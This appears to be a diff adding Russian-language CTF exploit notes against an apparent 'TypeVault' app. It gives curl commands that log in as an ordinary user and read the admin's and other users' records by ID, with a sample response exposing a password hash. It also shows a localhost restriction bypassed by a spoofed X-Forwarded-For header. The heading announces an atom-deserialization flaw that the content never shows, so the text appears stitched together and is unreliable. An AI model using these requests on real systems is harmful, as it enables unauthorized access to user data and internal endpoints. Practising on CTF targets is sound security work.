@@ -1,0 +1,46 @@
+typevault/export/session_codec КРИТИЧЕСКАЯ УЯЗВИМОСТЬ #1: Десериализация атомов в ETS/глобальные таблицы
+
+
+# 1. Залогиниться как обычный пользователь
+curl -X POST https://ctf-target.com/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"user@example.com","password":"user123"}' \
+  -c cookies.txt
+
+# 2. Прочитать данные админа (предполагая, что его ID = 1)
+curl -b cookies.txt https://ctf-target.com/api/users/1
+
+# 3. Прочитать данные любого другого пользователя
+curl -b cookies.txt https://ctf-target.com/api/users/2
+curl -b cookies.txt https://ctf-target.com/api/users/3
+
+# Пример ответа (user.get_user!):
+# {
+#   "id": 1,
+#   "username": "admin",
+#   "email": "admin@typevault.io",
+#   "role": "admin",
+#   "password_hash": "$2b$12$...",
+#   "bio": "System administrator"
+# }
+
+
+
+
+
+1. 🔴 INTERNAL ENDPOINTS ДОСТУПНЫ ТОЛЬКО ЧЕРЕЗ LOCALHOST
+elixir
+pipeline :internal do
+  plug TypeVaultWeb.Plugs.RequireLocalhost  # ❌ Можно подделать X-Forwarded-For
+end
+
+scope "/api/internal", TypeVaultWeb do
+  get "/status",   InternalController, :status
+  get "/projects", InternalController, :list_projects
+end
+ЭксплойТ:
+
+bash
+# Подделываем localhost
+curl -H "X-Forwarded-For: 127.0.0.1" https://ctf.com/api/internal/status
+curl -H "X-Forwarded-For: 127.0.0.1" https://ctf.com/api/internal/projects
